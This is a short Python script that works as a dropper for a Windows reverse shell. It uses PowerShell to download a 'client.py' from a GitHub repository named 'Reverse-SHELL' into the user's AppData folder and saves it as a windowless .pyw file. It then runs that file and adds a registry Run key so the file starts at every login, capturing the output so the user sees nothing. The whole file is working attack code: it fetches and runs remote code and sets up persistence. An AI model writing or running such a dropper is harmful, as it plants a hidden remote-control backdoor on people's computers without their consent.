import os, sys, subprocess

username = os.environ.get('USERNAME')
path = os.environ['appdata']
file_path = path = os.environ['appdata'] + '\\client.pyw'

################################################ setup #################################################################
powershell_command = (f'powershell invoke-webrequest -uri "https://raw.githubusercontent.com/SmartBoyMuzaffar/Reverse'
                      f'-SHELL/master/client.py" -outfile "{path}\\client.pyw"')
subprocess.run(["powershell", "-Command", powershell_command], capture_output=True, text=True)

powershell_command = f'powershell.exe {path}\\client.pyw'
subprocess.run(["powershell", "-Command", powershell_command], capture_output=True, text=True)

powershell_command = f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v client /t REG_SZ /d "' + file_path + '"'
subprocess.run(["powershell", "-Command", powershell_command], capture_output=True, text=True)

# subprocess.call(
#             'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v client /t REG_SZ /d "' + file_path + '"',
#             shell=True)
################################################ done ##################################################################
